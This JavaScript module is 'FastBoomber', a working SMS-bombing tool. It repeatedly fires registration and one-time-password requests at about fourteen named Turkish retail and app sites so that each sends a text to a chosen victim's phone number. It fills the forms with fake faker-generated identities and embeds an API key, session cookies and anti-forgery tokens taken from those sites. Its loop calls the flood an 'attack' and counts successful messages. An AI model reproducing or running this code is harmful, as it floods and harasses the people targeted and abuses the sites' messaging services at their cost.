const request = require('request');
const colors = require('colors');
const { faker } = require('@faker-js/faker');

class GlobalRequest {
    constructor(options) {
        this.site = options.site;
        this.headers = options.headers || {};
        this.form = options.form || {};
        this.json = options.json || {};
        this.body = options.body || {};
        this.no = options.no;
    }

    async start() {
        let r  = new Promise((resolve, reject) => {
            console.log(`[INFO] Registering with phone number: ${this.no} on platform: ${this.site}`.yellow);
            request({
                url: this.site,
                method: 'POST',
                headers: this.headers,
                form: this.form,
                json: this.json,
                body: this.body
            }, (error, response, body) => {
                if (response?.statusCode == 200 || response?.statusCode == 202) {
                    resolve({status: true, message: `Successfully registered with phone number: ${this.no}. Platform: ${this.site}` });
                } else {
                    resolve({ status: false, message: `An error occurred while registering with phone number: ${this.no}. Platform: ${this.site}` });
                }
            });
        });
        return r;
    }
}


class Kigli {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://www.kigili.com/users/registration/',
            form: {
                "first_name": faker.person.firstName(),
                "last_name": faker.person.lastName(),
                "email": faker.internet.email(),
                "phone": `0${this.no}`,
                "password": "nwejkfıower32",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            },
            no: this.no
        }).start();

        return r;
    }
}


class KahveDunyasi {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://core.kahvedunyasi.com/api/users/sms/send',
            form: {
                "mobile_number": this.no,
                "token_type": "register_token"
            },
            no: this.no
        }).start();

        return r;
    }
}

class naosstars {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://shop.naosstars.com/users/register',
            form: {
                "email": faker.internet.email(),
                "first_name": faker.person.firstName(),
                "last_name": faker.person.lastName(),
                "password": "nwejkfıower32",
                "date_of_birth": "1999-01-01",
                "phone": `0${this.no}`,
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            },
            no: this.no
        }).start();

        return r;
    }
}

class wmf {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://www.wmf.com.tr/users/register/',
            form: {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": faker.internet.email(),
                "email_allowed": "true",
                "first_name": faker.person.firstName(),
                "gender": "male",
                "last_name": faker.person.lastName(),
                "password": "nwejkfıower32",
                "phone": `0${this.no}`,
            },
            no: this.no
        }).start();

        return r;
    }
}

class bim {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://bim.veesk.net:443/service/v1.0/account/login',
            json: {
                "phone": `${this.no}`,
            },
            no: this.no
        }).start();

        return r;
    }
}

class sok {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://api.ceptesok.com:443/api/users/sendsms',
            json: {
                "mobile_number": this.no,
                "token_type": "register_token"
            },
            no: this.no
        }).start();

        return r;
    }
}

class migros {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
            json: {
                "phoneNumber": this.no,
            },
            no: this.no
        }).start();

        return r;
    }
}


class a101 {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://www.a101.com.tr:443/users/otp-login/',
            json: {
                "phone": `0${this.no}`,
                "next": "/a101-kapida"
            },
            no: this.no
        }).start();

        return r;
    }
}


class englishhome {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://www.englishhome.com:443/enh_app/users/registration/',
            form: {
                "first_name": faker.person.firstName(),
                "last_name": faker.person.lastName(),
                "email": faker.internet.email(),
                "phone": `0${this.no}`,
                "password": "nwejkfıower32",
                "email_allowed": "true",
                "sms_allowed": "true",
                "confirm": "true",
                "tom_pay_allowed": "true"
            },
            no: this.no
        }).start();

        return r;
    }
}

class sakasu {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://www.sakasu.com.tr:443/app/api_register/step1',
            form: {
                "phone": `0${this.no}`,
            },
            no: this.no
        }).start();

        return r;
    }
}

class bodrum {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://gandalf.orwi.app:443/api/user/requestOtp',
            headers: {
                "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
            },
            json: {
                "gsm": `+90${this.no}`,
                "source": "orwi"
            },
            no: this.no
        }).start();

        return r;
    }
}


class frink {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://api.frink.com.tr:443/api/auth/postSendOTP',
            headers: {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1",
                "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
                "Connection": "close"
            },
            json: {
                "areaCode": "90",
                "etkContract": true,
                "language": "TR",
                "phoneNumber": `90${this.no}`
            },
            no: this.no
        }).start();

        return r;
    }
}


class pidem {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://restashop.azurewebsites.net:443/graphql/',
            headers: {
                'accept': '*/*',
                'accept-language': 'tr,en;q=0.9,tr-TR;q=0.8',
                'authorization': 'Bearer null',
                'content-type': 'application/json',
                'origin': 'https://pidem.com.tr',
                'referer': 'https://pidem.com.tr/',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
            },
            body: JSON.stringify({
                query: `
                    mutation ($phone: String) {
                        sendOtpSms(phone: $phone) {
                            resultStatus
                            message
                        }
                    }
                `,
                variables: {
                    phone: this.no
                }
            }),
            no: this.no
        }).start();

        return r;
    }
}

class sencossla {
    constructor(options) {
        this.no = options.no;
    }

    start() {
        const r  = new GlobalRequest({
            site: 'https://sencossla.com/Customer/AddTempUser',
            headers: {
                'accept': '*/*',
                'accept-language': 'tr,en;q=0.9,tr-TR;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'SSCode=596A63314D6D5934596D51745A6D4A6A5A4330305A6A686A4C574A684E574574597A64684D54497a595467334F47466d; .AspNetCore.Culture=c%3Dtr-TR%7Cuic%3Dtr-TR; ActiveProductGroup=0; .AspNetCore.Antiforgery.AMcXIeVylAw=CfDJ8JefHizzXexBnofaoh0s5H7xY87HpG-EEjYCMniU9y_bVwonJWimc5dp7m_jDFHYkdYmviNFcOX5sOhjCbPUcNGyjgkb2xUB58NUnbH8IJKFWa9H-0irb9JWiHxj_WuMUb5LsaPCbBqRGx-b4QniN6E; cookieconsent_status=dismiss',
                'origin': 'https://sencossla.com',
                'referer': 'https://sencossla.com/SignUp',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            },
            body: `CountryPhoneCode=90&Name=${faker.person.firstName()}&Surname=${faker.person.lastName()}&Phone=${this.no}&EMail=${faker.internet.email()}&Password=DES9.yYLcq8nL&ComFirmPassword=DES9.yYLcq8nL&number=&number=&number=&number=&number=&number=&userContract=true&__RequestVerificationToken=CfDJ8JefHizzXexBnofaoh0s5H646a0AOpW-r_4mrYFwDn07a2vIjPE-dNBQk7U0PFHBgJFSAOZLgIHjNFa2hfKlshjFNxWO7xSAMVTZQdrfUDVnPyY2JjpqXjAiXuBMg_e55TAHFyGkDjr4cfVWLm5xX1k&userContract=false&notifyMe=false&X-Requested-With=XMLHttpRequest`,
            no: this.no
        }).start();

        return r;
    }
}


class FastBoomber {
    constructor(options) {
        this.target = options.target;
        this.amount = options.amount;
        this.count = 0;
        this.errors = 0;
    }

    start() {
        console.log(`[INFO] Starting attack on ${this.target} with ${this.amount} messages...`.yellow);
        this.attack();
    }

    async attack() {
        if (this.count >= this.amount) {
            console.log(`[INFO] Attack on ${this.target} finished!`.green);

            return;
        } else {
            
            try {
                await new Kigli({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new KahveDunyasi({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new naosstars({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new wmf({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new bim({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new sok({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new migros({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new a101({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new englishhome({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new sakasu({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new bodrum({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new frink({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new pidem({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });
                await new sencossla({ no: this.target }).start().then(async (res) => { if (res.status) { this.count++; console.log(`[SUCCESS] ${res.message}`.green); } else { this.errors++; console.log(`[ERROR] ${res.message}`.red); } });

                this.attack();
            } catch (error) {      
                console.log(`[ERROR] ${error}`.red);
            }

            console.log(`[INFO] Attack finished with ${this.count} successful and ${this.errors} failed attempts.`.green)
        }
    }
}

module.exports = {
    FastBoomber,
};